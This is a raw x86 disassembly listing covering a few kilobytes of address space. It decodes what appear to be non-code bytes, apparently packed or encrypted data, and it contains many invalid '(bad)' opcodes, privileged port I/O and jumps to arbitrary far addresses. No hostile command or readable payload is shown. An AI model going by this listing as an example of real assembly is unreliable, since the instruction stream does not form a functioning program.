  4130b8:	fdiv   QWORD PTR [edx-0x3f8a3daa]
  4130be:	shl    BYTE PTR [ebp+0x12],0xa2
  4130c2:	ins    DWORD PTR es:[edi],dx
  4130c3:	(bad)  
  4130c4:	push   eax
  4130c5:	inc    edx
  4130c6:	jge    0x413124
  4130c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130c9:	test   al,0x78
  4130cb:	xchg   esi,eax
  4130cc:	sub    ebp,DWORD PTR [eax]
  4130ce:	jg     0x4130a7
  4130d0:	out    0x14,eax
  4130d2:	dec    ecx
  4130d3:	jnp    0x41314c
  4130d5:	adc    BYTE PTR [edx+0x5a],al
  4130d8:	pop    ebx
  4130d9:	outs   dx,BYTE PTR ds:[esi]
  4130da:	mov    bl,0xe7
  4130dc:	mov    WORD PTR [edx-0x52],cs
  4130df:	fnstcw WORD PTR [ebp-0x53a473f7]
  4130e5:	xor    al,0x90
  4130e7:	inc    ebp
  4130e8:	cld    
  4130e9:	jo     0x4130c3
  4130eb:	and    eax,0x51b2afde
  4130f0:	test   DWORD PTR [ebp-0x78],0x257ad42a
  4130f7:	mov    al,0x2a
  4130f9:	dec    esp
  4130fa:	dec    ecx
  4130fb:	in     al,dx
  4130fc:	jp     0x41310f
  4130fe:	ss (bad) 
  413100:	add    al,0x97
  413102:	int3   
  413103:	retf   0x300
  413106:	cli    
  413107:	in     eax,dx
  413108:	sbb    ebp,edi
  41310a:	test   al,0x77
  41310c:	into   
  41310d:	std    
  41310e:	test   al,0xf6
  413110:	mov    ecx,0xc5d299d2
  413115:	mov    edi,0x8d3a308d
  41311a:	adc    BYTE PTR [ecx],dl
  41311c:	out    0xad,al
  41311e:	xchg   edi,ebp
  413120:	int3   
  413121:	std    
  413122:	(bad)  
  413123:	and    DWORD PTR [ecx-0x2fbc2881],ebx
  413129:	rcl    BYTE PTR [edx+0x30],1
  41312c:	jmp    0x40fc9703
  413131:	sub    eax,0x54936995
  413136:	lock lock and DWORD PTR [esi],esi
  41313a:	adc    ebx,DWORD PTR [edx-0x58]
  41313d:	xchg   esp,eax
  41313e:	sub    ch,BYTE PTR [ecx-0xa312fc4]
  413144:	add    al,0xec
  413146:	dec    edi
  413147:	mov    al,0xc3
  413149:	popa   
  41314a:	add    ebx,DWORD PTR [edi+0x57da6af5]
  413150:	mov    al,fs:0xe7fcfd10
  413156:	mov    bh,0x7c
  413158:	push   ebx
  413159:	shl    ecx,1
  41315b:	pop    eax
  41315c:	sahf   
  41315d:	jmp    0x4130f7
  41315f:	mov    ebx,0x5d14bf18
  413164:	ins    BYTE PTR es:[edi],dx
  413165:	sar    BYTE PTR [edi-0x72],cl
  413168:	push   cs
  413169:	cmp    eax,0x6bb41ee7
  41316e:	jecxz  0x413174
  413170:	cli    
  413171:	call   0x5fb48958
  413176:	mov    edx,0x5ed5f2a8
  41317b:	cmovne ebp,DWORD PTR ds:0xe5757362
  413182:	xchg   ebx,eax
  413183:	pop    esi
  413184:	pop    ebp
  413185:	cs mov edx,ecx
  413188:	dec    esi
  413189:	push   ecx
  41318a:	out    0x7b,al
  41318c:	rol    DWORD PTR [eax],1
  41318e:	dec    edx
  41318f:	pop    si
  413191:	cli    
  413192:	jecxz  0x413206
  413194:	imul   ebx,DWORD PTR [ebx+0x13142b0],0x967c304
  41319e:	in     eax,0x8
  4131a0:	and    al,0xff
  4131a2:	or     eax,0x7b22e216
  4131a7:	inc    esp
  4131a8:	sbb    esp,0xffffff8d
  4131ab:	in     eax,dx
  4131ac:	pop    esi
  4131ad:	sahf   
  4131ae:	imul   ebx,DWORD PTR [edi],0x30e3fb5d
  4131b4:	cdq    
  4131b5:	ss mov al,0xed
  4131b8:	jg     0x413187
  4131ba:	loop   0x4131bc
  4131bc:	mov    eax,0x9f2476b9
  4131c1:	and    eax,0x3f421c07
  4131c6:	mov    edx,esp
  4131c8:	add    eax,0xc5226b69
  4131cd:	xor    ebp,esp
  4131cf:	pop    es
  4131d0:	sbb    al,0xbc
  4131d2:	jp     0x41321a
  4131d4:	mov    WORD PTR ds:0x139c65d,gs
  4131da:	cld    
  4131db:	mov    WORD PTR [esi+0x3e],ds
  4131de:	aaa    
  4131df:	adc    ah,BYTE PTR [ebp+0x677ab4d2]
  4131e5:	jb     0x413229
  4131e7:	mov    ebp,0x27204ef4
  4131ec:	xchg   BYTE PTR [edi+ecx*8+0x57],ah
  4131f0:	inc    eax
  4131f1:	or     eax,0x2de395e6
  4131f6:	push   ebp
  4131f7:	pop    ebx
  4131f8:	sahf   
  4131f9:	jno    0x413232
  4131fb:	pop    ss
  4131fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fd:	icebp  
  4131fe:	jmp    FWORD PTR [edi]
  413200:	add    ebp,eax
  413202:	jns    0x413238
  413204:	xor    cl,0x4a
  413207:	adc    bh,BYTE PTR [ebp+0x2b]
  41320a:	fwait
  41320b:	repz in eax,dx
  41320d:	add    esp,DWORD PTR [esi]
  41320f:	cmp    BYTE PTR [eax-0x768f1ca6],ch
  413215:	mov    DWORD PTR [ebx+esi*4-0x1a],eax
  413219:	inc    esi
  41321a:	mov    dl,0xf3
  41321c:	add    ebp,DWORD PTR [edi+0x66]
  41321f:	pop    ds
  413220:	mov    ds:0x373e38e0,al
  413225:	lods   al,BYTE PTR ds:[esi]
  413226:	cli    
  413227:	xchg   ebp,eax
  413228:	aam    0xf5
  41322a:	push   eax
  41322b:	loopne 0x413273
  41322d:	pop    ds
  41322e:	jbe    0x413224
  413230:	clc    
  413231:	cwd    
  413233:	fwait
  413234:	jns    0x4132ad
  413236:	out    0x98,eax
  413238:	pop    esp
  413239:	inc    esi
  41323a:	(bad)  
  41323b:	mov    ss,WORD PTR [edx+0x7d]
  41323e:	pop    eax
  41323f:	outs   dx,BYTE PTR ds:[esi]
  413240:	mov    bl,0x33
  413242:	mov    ebx,0xc475ae43
  413247:	and    ch,BYTE PTR [eax]
  413249:	add    ch,al
  41324b:	and    bl,BYTE PTR [ebp-0x7673d6f3]
  413251:	sbb    BYTE PTR [esp],bh
  413254:	aad    0xe4
  413256:	xchg   ecx,eax
  413257:	mov    dh,0xc4
  413259:	stos   DWORD PTR es:[edi],eax
  41325a:	pop    es
  41325b:	out    0xb0,al
  41325d:	(bad)  
  41325e:	push   cs
  41325f:	call   0x7e4c7d6c
  413264:	div    DWORD PTR [ebx-0x10]
  413267:	mov    ch,0xef
  413269:	fcom   DWORD PTR [eax]
  41326b:	mov    al,ds:0x1addc96f
  413270:	mov    ebp,0x78a4f298
  413275:	sbb    DWORD PTR fs:0xc3f96dee,esp
  41327c:	ret    0xee9a
  41327f:	push   ebp
  413280:	outs   dx,DWORD PTR ds:[esi]
  413281:	inc    esi
  413282:	lods   eax,DWORD PTR ds:[esi]
  413283:	js     0x413244
  413285:	out    dx,eax
  413286:	add    eax,0x98beb750
  41328b:	jne    0x413211
  41328d:	in     eax,0xaa
  41328f:	gs dec edx
  413291:	xor    dh,dh
  413293:	push   0x7
  413295:	pop    ebx
  413296:	inc    eax
  413297:	jl     0x41322d
  413299:	std    
  41329a:	lods   al,BYTE PTR ds:[esi]
  41329b:	and    edx,DWORD PTR [edx]
  41329d:	sar    ebx,cl
  41329f:	in     al,dx
  4132a0:	and    BYTE PTR [edx+0x14],bl
  4132a3:	adc    ecx,edi
  4132a5:	add    eax,0xfd338cc1
  4132aa:	jns    0x413276
  4132ac:	mov    eax,ds:0x66c28b1b
  4132b1:	dec    edx
  4132b2:	aad    0x6a
  4132b4:	xor    eax,0x796291bd
  4132b9:	ret    
  4132ba:	out    0x60,al
  4132bc:	std    
  4132bd:	fst    QWORD PTR [edi]
  4132bf:	mov    ds:0xfe6499dc,al
  4132c4:	(bad)  
  4132c5:	pop    ebp
  4132c6:	fs xor al,0xc5
  4132c9:	in     eax,0xb3
  4132cb:	les    eax,FWORD PTR [ebx-0x6b935cff]
  4132d1:	(bad)
  4132d5:	sub    al,0x76
  4132d7:	pop    ss
  4132d8:	(bad)  
  4132d9:	test   BYTE PTR [eax],dh
  4132db:	pop    ebx
  4132dc:	stos   DWORD PTR es:[edi],eax
  4132dd:	scas   eax,DWORD PTR es:[edi]
  4132de:	loope  0x413280
  4132e0:	repnz push edx
  4132e2:	sbb    DWORD PTR [eax+edx*1+0x496b01c5],esi
  4132e9:	lds    esi,FWORD PTR [edx-0x50]
  4132ec:	xchg   edx,eax
  4132ed:	fs xchg edi,eax
  4132ef:	mov    ecx,0xa868dc00
  4132f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f5:	or     al,0x5d
  4132f7:	mov    ebx,0x41683140
  4132fc:	sub    ecx,esi
  4132fe:	add    ebx,0xc573a598
  413304:	call   0x308f:0x2213a4b8
  41330b:	imul   edx,DWORD PTR [eax+0x6],0x3ee37c4c
  413312:	xchg   BYTE PTR [ebp-0x6fcd2472],cl
  413318:	call   0xa2dff18b
  41331d:	sar    BYTE PTR [edi],1
  41331f:	adc    esi,0xf8aa0141
  413325:	lds    ebx,FWORD PTR [edi]
  413327:	pop    esp
  413328:	inc    esp
  413329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41332a:	dec    ebp
  41332b:	daa    
  41332c:	mov    cl,0xcc
  41332e:	js     0x4132ea
  413330:	jae    0x413338
  413332:	xor    esi,edx
  413334:	mul    BYTE PTR [ebx-0x75]
  413337:	pop    ebx
  413338:	pop    esp
  413339:	cdq    
  41333a:	clc    
  41333b:	(bad)  
  41333c:	mov    ds,WORD PTR [ecx+0x4a4aa109]
  413342:	xor    eax,0x769603fc
  413347:	aaa    
  413348:	dec    eax
  413349:	sub    dh,BYTE PTR [esi-0x4de36573]
  41334f:	sub    eax,0x20545fe8
  413354:	(bad)  
  413356:	and    al,0x43
  413358:	mov    dh,0x26
  41335a:	fild   WORD PTR [edx-0x1b4f6f1a]
  413360:	xor    bl,BYTE PTR [esi-0x6d]
  413363:	mov    esp,0x522e3a6d
  413368:	push   eax
  413369:	leave  
  41336a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41336b:	xor    ecx,DWORD PTR [edx+0x67]
  41336e:	addr16 mul dl
  413371:	es push esp
  413373:	push   es
  413374:	jge    0x41332e
  413376:	inc    edi
  413377:	dec    ebp
  413378:	das    
  413379:	sub    ecx,DWORD PTR [eax+0x51]
  41337c:	xchg   esi,eax
  41337d:	sbb    eax,0xa852b675
  413382:	sbb    esp,eax
  413384:	pop    ebp
  413385:	mov    ss,WORD PTR [eax-0xc]
  413388:	adc    al,0xbf
  41338a:	xchg   esp,eax
  41338b:	hlt    
  41338c:	imul   eax,DWORD PTR [esi-0x7ec6ff73],0x74eb1590
  413396:	fnsave [esi+0x1]
  413399:	or     eax,0x14325400
  41339e:	xchg   DWORD PTR [edi+0x60ab984],ecx
  4133a4:	and    eax,0x90affa77
  4133a9:	push   ecx
  4133aa:	xchg   ebp,eax
  4133ac:	xchg   ebx,eax
  4133ad:	push   ss
  4133ae:	inc    ebp
  4133af:	xchg   edx,eax
  4133b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133b1:	adc    eax,0xdb7d35fc
  4133b6:	hlt    
  4133b7:	cwde   
  4133b8:	fist   DWORD PTR [esi-0x1c8c32cd]
  4133be:	jg     0x41343a
  4133c0:	xchg   ebx,eax
  4133c1:	nop
  4133c2:	xor    ch,BYTE PTR [ebp+edi*2-0x6b]
  4133c6:	adc    bh,BYTE PTR ds:[edi+edx*4]
  4133ca:	loope  0x4133a4
  4133cc:	mov    edx,DWORD PTR [ecx]
  4133ce:	lods   eax,DWORD PTR ds:[esi]
  4133cf:	enter  0xf662,0x8c
  4133d3:	sbb    DWORD PTR [edx+0x54],edx
  4133d6:	ss ds sahf 
  4133d9:	retf   
  4133da:	jecxz  0x413418
  4133dc:	pushf  
  4133dd:	add    DWORD PTR [ecx+0x5585b0dd],0x357d9b7a
  4133e7:	ret    
  4133e8:	fcom   QWORD PTR [ebx]
  4133ea:	dec    eax
  4133eb:	lahf   
  4133ec:	adc    eax,0xe9545155
  4133f1:	or     bl,BYTE PTR [ebx-0x77]
  4133f4:	test   BYTE PTR [ebx+edi*8-0x26],dh
  4133f8:	and    al,0x85
  4133fa:	dec    esp
  4133fb:	shl    BYTE PTR [ebx],1
  4133fd:	scas   al,BYTE PTR es:[edi]
  4133fe:	out    0x28,eax
  413400:	bound  ebp,QWORD PTR [ecx]
  413402:	push   0x6a
  413404:	into   
  413405:	repnz and DWORD PTR [edi-0x45],ebx
  413409:	fisttp QWORD PTR [edi-0x12]
  41340c:	and    dl,BYTE PTR [ebx-0x225c2423]
  413412:	jge    0x413395
  413414:	lahf   
  413415:	mov    ecx,0xf5985cf7
  41341a:	ins    BYTE PTR es:[edi],dx
  41341b:	push   ebx
  41341c:	(bad)  
  41341d:	fnsave [edi-0x69]
  413420:	fldcw  WORD PTR [ebp+0x14b8ba80]
  413426:	addr16 jmp 0x41347f
  413429:	inc    ebx
  41342a:	call   0x3a6c22c3
  41342f:	lea    esp,[esi-0x62dbc886]
  413435:	or     BYTE PTR [esi],ch
  413437:	mov    BYTE PTR [eax],dh
  413439:	frstor [edx+0x3d]
  41343c:	pop    eax
  41343d:	mov    esp,DWORD PTR [ebx+0x70]
  413440:	out    0xf9,eax
  413442:	mov    edx,0x631c9823
  413447:	cmp    ebp,DWORD PTR [ebx]
  413449:	sti    
  41344a:	rcr    DWORD PTR [eax-0x49d33694],0x8b
  413451:	inc    ecx
  413452:	xor    ecx,DWORD PTR [esi+0xa6c9379]
  413458:	fsubr  DWORD PTR [ecx]
  41345a:	push   esp
  41345b:	jg     0x41349d
  41345d:	fcmovbe st,st(2)
  41345f:	retf   0xf66d
  413462:	sub    al,ch
  413464:	aad    0x80
  413466:	and    edx,ebx
  413468:	add    al,0xde
  41346a:	inc    esp
  41346b:	xchg   ebp,eax
  41346c:	jl     0x4134e0
  41346e:	gs mov eax,0x1f3cdf11
  413474:	repnz add ch,dh
  413477:	mov    cl,0xe6
  413479:	iret   
  41347a:	jge    0x4134aa
  41347c:	inc    ebp
  41347d:	lods   al,BYTE PTR ds:[esi]
  41347e:	aam    0xe1
  413480:	pop    ds
  413481:	fmul   DWORD PTR [edx-0x42a5bdce]
  413487:	jmp    0x64019511
  41348c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41348d:	ror    DWORD PTR [eax+0x5fb72f3],cl
  413493:	aaa    
  413494:	arpl   WORD PTR [eax+ebx*1+0x6eefafcc],bx
  41349b:	gs (bad) 
  41349d:	pop    ecx
  41349e:	(bad)  
  41349f:	stos   BYTE PTR es:[edi],al
  4134a0:	adc    esi,eax
  4134a2:	add    eax,0x4470abdd
  4134a7:	sbb    eax,0xf7ea2764
  4134ac:	cli    
  4134ad:	nop
  4134ae:	add    edi,0x853118b3
  4134b4:	(bad)  [ecx+0x5b]
  4134b7:	add    ch,0xd7
  4134ba:	ret    
  4134bb:	inc    edx
  4134bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134bd:	mov    eax,0x8c103a49
  4134c2:	mov    esp,0xd47cc8f0
  4134c7:	daa    
  4134c8:	in     al,0x81
  4134ca:	loopne 0x41345f
  4134cc:	das    
  4134cd:	pop    ds
  4134ce:	rcl    DWORD PTR [ebx+0x49b87138],cl
  4134d4:	jno    0x413473
  4134d6:	xchg   edi,eax
  4134d7:	mov    cl,0x74
  4134d9:	pusha  
  4134da:	jbe    0x413478
  4134dc:	push   ecx
  4134dd:	and    DWORD PTR [ecx+esi*2-0x6c0279ab],esp
  4134e4:	shl    ah,0xb2
  4134e7:	outs   dx,DWORD PTR ds:[esi]
  4134e8:	stos   DWORD PTR es:[edi],eax
  4134e9:	out    0x9a,eax
  4134eb:	xchg   BYTE PTR [eax],bh
  4134ed:	inc    esp
  4134ee:	dec    ecx
  4134ef:	bound  esp,QWORD PTR [ecx]
  4134f1:	ret    
  4134f2:	push   ebp
  4134f3:	dec    esp
  4134f4:	push   ds
  4134f5:	mov    WORD PTR [edx+ecx*4-0x7395bdef],?
  4134fc:	sbb    ch,BYTE PTR [ebp-0x1a]
  4134ff:	test   al,0x36
  413501:	add    eax,0x7c80f3
  413506:	push   ebp
  413507:	sub    edx,DWORD PTR [edx-0x51]
  41350a:	int3   
  41350b:	mov    WORD PTR [edi+eax*4+0x3da80aae],?
  413512:	inc    edi
  413513:	ror    DWORD PTR ds:0x10c1b3c5,cl
  413519:	pop    ebp
  41351a:	jmp    0x44d9:0x4145e2dd
  413521:	xchg   ebp,eax
  413522:	push   esi
  413523:	add    bh,0x31
  413526:	ins    DWORD PTR es:[edi],dx
  413527:	das    
  413528:	and    edi,DWORD PTR [edi]
  41352a:	enter  0x4e66,0xbb
  41352e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41352f:	into   
  413530:	add    ecx,DWORD PTR [edx]
  413532:	clc    
  413533:	gs jne 0x4134f0
  413536:	xrelease mov DWORD PTR [ebx+0x7a],esi
  41353a:	dec    eax
  41353b:	pop    edx
  41353c:	adc    dl,BYTE PTR [ebp+0x1b547350]
  413542:	xor    BYTE PTR [edx],0x12
  413545:	pop    esp
  413546:	jns    0x413564
  413548:	adc    BYTE PTR [esi],bh
  41354a:	jo     0x413577
  41354c:	mov    al,0xc9
  41354e:	pop    eax
  41354f:	into   
  413550:	jg     0x4135ac
  413552:	fcom   QWORD PTR [esi]
  413554:	add    cl,BYTE PTR [eax+0x70135259]
  41355a:	adc    BYTE PTR [edi-0x171cd438],al
  413560:	add    edx,esi
  413562:	daa    
  413563:	xlat   BYTE PTR ds:[ebx]
  413564:	mov    cl,0xf7
  413566:	retf   0xdf4d
  413569:	les    ebx,FWORD PTR [ecx-0x35cbdf98]
  41356f:	dec    esp
  413570:	es pushf 
  413572:	fcomp  DWORD PTR [eiz*8+0x4fc905e8]
  413579:	jb     0x413558
  41357b:	in     eax,dx
  41357c:	sub    bl,bh
  41357e:	lods   al,BYTE PTR ds:[esi]
  41357f:	inc    ebx
  413580:	pop    eax
  413581:	xlat   BYTE PTR ds:[ebx]
  413582:	int3   
  413583:	(bad)  
  413584:	stos   BYTE PTR es:[edi],al
  413585:	pop    edx
  413586:	or     ecx,edi
  413588:	(bad)  
  413589:	rol    BYTE PTR [ebp-0x42],1
  41358c:	and    BYTE PTR [edx+edi*8],cl
  41358f:	ins    BYTE PTR es:[edi],dx
  413590:	repz sub BYTE PTR [edi],dh
  413593:	data16 fwait
  413595:	mov    BYTE PTR [esi+0x25],0xa6
  413599:	xchg   esi,eax
  41359a:	js     0x4135b9
  41359c:	call   0xf923ac05
  4135a1:	stc    
  4135a2:	stos   DWORD PTR es:[edi],eax
  4135a3:	faddp  st(2),st
  4135a5:	scas   al,BYTE PTR es:[edi]
  4135a6:	mov    fs,esp
  4135a8:	out    dx,eax
  4135a9:	loopne 0x413608
  4135ab:	int3   
  4135ac:	mov    ch,0xc2
  4135ae:	inc    ecx
  4135af:	inc    DWORD PTR ds:0x5ae9e6c3
  4135b5:	inc    edx
  4135b6:	les    edi,FWORD PTR [edi-0x52]
  4135b9:	icebp  
  4135ba:	add    al,0x89
  4135bc:	mov    edx,0x9822da5
  4135c1:	and    ebx,ecx
  4135c3:	jmp    0x6ec003df
  4135c8:	sbb    BYTE PTR ds:0xc2c50285,bl
  4135ce:	xchg   esp,eax
  4135cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135d0:	fild   WORD PTR [edx+0x4d16dad2]
  4135d6:	mov    ebp,0x2f49606e
  4135db:	sub    eax,0x6313600d
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [esp+0x21]
  4135e5:	pop    edx
  4135e6:	je     0x413641
  4135e8:	add    DWORD PTR [eax+0x158fa194],0xc16b1c4c
  4135f2:	xchg   esi,eax
  4135f3:	(bad)  
  4135f4:	dec    ecx
  4135f5:	dec    edx
  4135f6:	js     0x413634
  4135f8:	and    eax,0xbb366a7
  4135fd:	imul   esi,ebp,0xffffff90
  413600:	retf   
  413601:	sti    
  413602:	pop    ebx
  413603:	xchg   esi,eax
  413604:	xchg   ecx,eax
  413605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413606:	in     eax,dx
  413607:	pop    ds
  413608:	inc    edx
  413609:	lahf   
  41360a:	mov    ds:0x41fcc1ae,al
  41360f:	push   edi
  413610:	pop    ecx
  413611:	dec    eax
  413612:	addr16 into 
  413614:	clc    
  413615:	stc    
  413616:	icebp  
  413617:	jbe    0x4135e0
  413619:	retf   0xdf26
  41361c:	mov    ds:0xdfc79d5c,al
  413621:	leave  
  413622:	push   edx
  413623:	adc    BYTE PTR [esi],bh
  413625:	repz lock bswap ebx
  413629:	je     0x413645
  41362b:	pop    ds
  41362c:	mov    esi,0x88461e4a
  413631:	pop    esi
  413632:	mov    edx,0x6355a1cd
  413637:	addr16 adc eax,0x7e543b81
  41363d:	test   eax,0xffb95426
  413642:	inc    esp
  413643:	push   esi
  413644:	sahf   
  413645:	call   0x5ae86602
  41364a:	and    ebp,DWORD PTR ds:0x4bf1fa1a
  413650:	mov    eax,0x3ad5ccb
  413655:	adc    DWORD PTR [eax],esi
  413657:	pop    ebx
  413658:	ror    bl,0xbd
  41365b:	inc    edx
  41365c:	and    esi,DWORD PTR [esi+0x420699d7]
  413662:	add    al,0x23
  413664:	adc    bh,BYTE PTR [edi-0x5c85c22d]
  41366a:	inc    ebp
  41366b:	cli    
  41366c:	sub    eax,0x904962fa
  413671:	xchg   edx,eax
  413672:	xor    eax,0x5e459208
  413677:	aad    0x27
  413679:	aad    0xed
  41367b:	arpl   si,sp
  41367d:	fwait
  41367e:	xor    DWORD PTR [esi-0x4b],0xffffffb9
  413682:	jmp    0xd2c5:0xb1215e60
  413689:	xor    DWORD PTR [esi+0xff09dbe],esi
  41368f:	mov    ah,0x56
  413691:	cs dec edx
  413693:	sbb    DWORD PTR [ecx+eiz*8],0xe72516fe
  41369a:	mov    ebp,0xf359dcf5
  41369f:	xchg   ecx,eax
  4136a0:	shl    edi,cl
  4136a2:	arpl   WORD PTR [esi],sp
  4136a4:	scas   al,BYTE PTR es:[edi]
  4136a5:	or     cl,cl
  4136a7:	pop    ebx
  4136a8:	inc    eax
  4136a9:	shl    BYTE PTR [edx+0x3bd200ed],cl
  4136af:	into   
  4136b0:	out    0xd7,eax
  4136b2:	cmp    DWORD PTR [edx],esp
  4136b4:	jle    0x4136eb
  4136b6:	xor    eax,0x66143fc4
  4136bb:	and    eax,0xc48dd08
  4136c0:	xor    BYTE PTR [esi-0x5a],cl
  4136c3:	je     0x413679
  4136c5:	adc    edi,DWORD PTR [edx]
  4136c7:	arpl   WORD PTR [eax],bx
  4136c9:	in     al,dx
  4136ca:	xor    BYTE PTR [ebp+0xb4881f4],dl
  4136d0:	sar    BYTE PTR [eax],1
  4136d2:	sbb    esp,DWORD PTR [ebx]
  4136d4:	mov    ds:0x22fef52a,al
  4136d9:	fs cmp si,bp
  4136dd:	ror    BYTE PTR [ecx],0x44
  4136e0:	(bad)  
  4136e1:	sub    BYTE PTR [ecx-0x2],cl
  4136e4:	xchg   BYTE PTR [ebp-0x3b1e63f5],dh
  4136ea:	fistp  QWORD PTR [ecx-0x57ce1149]
  4136f0:	iret   
  4136f1:	inc    edx
  4136f2:	repz sub eax,0xc48baf2b
  4136f8:	jns    0x413764
  4136fa:	or     ah,BYTE PTR [ebx]
  4136fc:	push   cs
  4136fd:	js     0x413779
  4136ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413700:	push   edx
  413701:	or     BYTE PTR [edi],ch
  413703:	icebp  
  413704:	pop    ss
  413705:	fild   QWORD PTR [eax]
  413707:	lahf   
  413708:	xchg   BYTE PTR [ecx+0x7ffdcf46],cl
  41370e:	arpl   WORD PTR [esi-0x77738e4c],bp
  413714:	mov    ch,BYTE PTR cs:[edi+edx*1+0x37]
  413719:	ror    dh,1
  41371b:	rcr    DWORD PTR [ebx-0x63],1
  41371e:	cmp    bh,BYTE PTR [esi]
  413720:	shl    DWORD PTR [edi-0x40],0x6
  413724:	adc    DWORD PTR [esi-0x2a4c2513],0x40
  41372b:	lea    ebx,[ecx]
  41372d:	pop    esp
  41372e:	jecxz  0x41378b
  413730:	popa   
  413731:	lea    ebp,[esi+ebx*8+0x3e606a53]
  413738:	pop    eax
  413739:	repz dec edx
  41373b:	leave  
  41373c:	rep ins BYTE PTR es:[edi],dx
  41373e:	cmc    
  41373f:	xchg   esi,eax
  413740:	call   0xb932:0xb3e45bc0
  413747:	inc    edi
  413748:	sbb    eax,0xcf6ce506
  41374d:	not    BYTE PTR [eax-0x18]
  413750:	jo     0x413784
  413752:	ja     0x413719
  413754:	(bad)  
  413755:	mov    edi,0x69c6315d
  41375a:	aam    0xd8
  41375c:	repnz call 0x5d5b:0x3af1785
  413764:	push   edi
  413765:	dec    ebx
  413766:	mov    cl,0xb2
  413768:	xor    ch,BYTE PTR [eax]
  41376a:	mov    eax,ds:0xbea36647
  41376f:	cld    
  413770:	push   ebp
  413771:	scas   al,BYTE PTR es:[edi]
  413772:	jb     0x4137d8
  413774:	btc    DWORD PTR [ebx+edx*1+0x48],ecx
  413779:	sub    eax,0xdc80574f
  41377e:	add    al,0x9
  413780:	dec    esp
  413781:	adc    eax,DWORD PTR [esp+eax*2]
  413784:	fstp   DWORD PTR [edi]
  413786:	add    bl,al
  413788:	daa    
  413789:	test   BYTE PTR [esi],ch
  41378b:	add    eax,0x3876722b
  413790:	adc    BYTE PTR [edx],bh
  413792:	push   esp
  413793:	ins    DWORD PTR es:[edi],dx
  413794:	add    edi,DWORD PTR [edi]
  413796:	push   edx
  413797:	and    DWORD PTR [esi],edx
  413799:	mov    bl,dl
  41379b:	aaa    
  41379c:	cmp    al,0xdb
  41379e:	mov    edx,0xb618468c
  4137a3:	mov    al,ds:0x7f7f9a95
  4137a8:	xchg   ecx,eax
  4137a9:	push   0xffffffe8
  4137ab:	and    al,0x4d
  4137ad:	add    DWORD PTR [ebp+0x467ebf9f],ecx
  4137b3:	push   ss
  4137b4:	and    dh,BYTE PTR [ecx]
  4137b6:	test   eax,0xc5bc16b8
  4137bb:	test   BYTE PTR [edx+edx*1+0x28],0x88
  4137c0:	popf   
  4137c1:	rcr    DWORD PTR [eax],0x43
  4137c4:	xor    al,ah
  4137c6:	out    dx,al
  4137c7:	popf   
  4137c8:	jne    0x413785
  4137ca:	xor    al,0x93
  4137cc:	popa   
  4137cd:	adc    BYTE PTR [edi-0x307e98e7],al
  4137d3:	xchg   ebx,eax
  4137d4:	loopne 0x413836
  4137d6:	rcl    BYTE PTR [edi+eiz*2],0x2b
  4137da:	dec    ecx
  4137db:	rcl    BYTE PTR [edi+0x10],cl
  4137de:	pop    esp
  4137df:	ins    BYTE PTR es:[edi],dx
  4137e0:	fisubr WORD PTR [eax+0x425d375c]
  4137e6:	cmp    eax,0xd8bf1e6e
  4137eb:	ja     0x413855
  4137ed:	cmp    BYTE PTR [esi],bl
  4137ef:	sub    ch,ah
  4137f1:	ds mov dl,bh
  4137f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137f5:	inc    edi
  4137f6:	xchg   edi,eax
  4137f7:	mov    BYTE PTR [esi-0x1b92ed4a],al
  4137fd:	stos   BYTE PTR es:[edi],al
  4137fe:	mov    ds:0x1d21261e,al
  413803:	mov    ds:0x99fd76e1,al
  413808:	jecxz  0x41385a
  41380a:	pusha  
  41380b:	fs jle 0x413882
  41380e:	(bad)  
  413810:	aam    0x47
  413812:	inc    edx
  413813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413814:	and    ecx,DWORD PTR es:[ecx+0x14]
  413818:	sbb    cl,bh
  41381a:	xor    DWORD PTR ds:0x95bf83ee,edi
  413820:	jmp    FWORD PTR [ebx]
  413822:	lock pop edi
  413824:	xor    BYTE PTR [ecx+0x7e],al
  413827:	adc    BYTE PTR [edi],dh
  413829:	pop    ds
  41382a:	sub    bh,BYTE PTR [ebx+esi*8]
  41382d:	inc    ebp
  41382e:	jecxz  0x41382f
  413830:	and    ebx,DWORD PTR [eax]
  413832:	fnsave [ebx]
  413834:	outs   dx,DWORD PTR ds:[esi]
  413835:	mov    cl,ch
  413837:	jge    0x413892
  413839:	sbb    ecx,DWORD PTR fs:[edi]
  41383c:	pop    ds
  41383d:	test   BYTE PTR [esi],dh
  41383f:	ins    DWORD PTR es:[edi],dx
  413840:	(bad)  
  413841:	xlat   BYTE PTR ds:[ebx]
  413842:	shr    DWORD PTR [eax+0x27],cl
  413845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413846:	sub    eax,0x928a7fdc
  41384b:	scas   al,BYTE PTR es:[edi]
  41384c:	retf   
  41384d:	push   edi
  41384e:	aad    0x6f
  413850:	mov    BYTE PTR [edx+0x56],cl
  413853:	repnz not DWORD PTR [ebp-0x64]
  413857:	xor    eax,0x3276089d
  41385c:	and    DWORD PTR [esi+0x63],0x9f004252
  413863:	imul   BYTE PTR [ebx+esi*2]
  413866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413867:	cmp    DWORD PTR [eax],esp
  413869:	jmp    0x1d79cf2e
  41386e:	lods   eax,DWORD PTR ds:[esi]
  41386f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413870:	adc    BYTE PTR ds:0x82b262,al
  413876:	sub    DWORD PTR [eax+0xb8678c3],0x722ea209
  413880:	jecxz  0x413837
  413882:	sub    eax,0x2c032e02
  413887:	inc    ecx
  413888:	add    dl,BYTE PTR [ebp-0x7275e613]
  41388e:	cmp    ebp,DWORD PTR [edi]
  413890:	sub    al,0x44
